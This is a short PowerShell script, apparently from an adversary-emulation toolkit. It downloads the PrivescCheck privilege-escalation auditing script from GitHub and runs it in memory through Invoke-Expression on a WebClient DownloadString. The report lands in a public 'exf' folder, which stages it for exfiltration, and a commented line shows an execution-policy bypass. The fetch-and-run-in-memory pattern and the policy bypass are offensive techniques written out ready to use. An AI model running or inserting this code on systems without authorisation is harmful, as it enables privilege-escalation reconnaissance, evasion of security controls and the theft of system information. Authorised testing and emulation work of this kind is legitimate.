# Downloads and lastest PrivesCheck Powershell Script
# Checks Privileges Escalation in PowerShell
# Technic ID : xxx
Clear-Host
Write-Output "=========================================================================================="
Write-Output "  Downloads and use PrivescCheck.ps1 to check Privileges escalation possibilites  (Txxx)"
Write-Output "=========================================================================================="
################ [ List of commpiled programs to downlad ] ################
$Ps1ScriptToUse = "PrivescCheck.ps1"
$ExecuteFrom = "https://github.com/itm4n/PrivescCheck/releases/latest/download"
#powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML"

################ [ GLOBAL VARIABLES ] ################
$TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff K"
$LogFile = "$env:PUBLIC\exf\Tool_PrivescCheck.txt";
$ExfDir= "$env:PUBLIC\exf\"
$ScriptParameters = "-Extended -Report $($ExfDir)PrivescCheck_$($env:COMPUTERNAME) -Format TXT"
$FullCommandToRun = "Invoke-PrivescCheck $ScriptParameters"
################ [ MAIN BODY ] ################
Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding utf8 -Force
Write-output "-------------------------------------"  | Out-File -FilePath $LogFile -Encoding utf8 -Append
Write-output "Script : $PSCommandPath has been launched on $TimeStamp" | Out-File -FilePath $LogFile -Encoding utf8 -Append
Write-output "-------------------------------------"  | Out-File -FilePath $LogFile -Encoding utf8 -Append
Write-Output "`n" | Out-File -FilePath "$LogFile" -Encoding utf8 -Append
$DownloadRun = $ExecuteFrom+"/"+$Ps1ScriptToUse
Invoke-Expression (New-Object System.Net.WebClient).DownloadString($DownloadRun)
Invoke-Expression -Command $FullCommandToRun

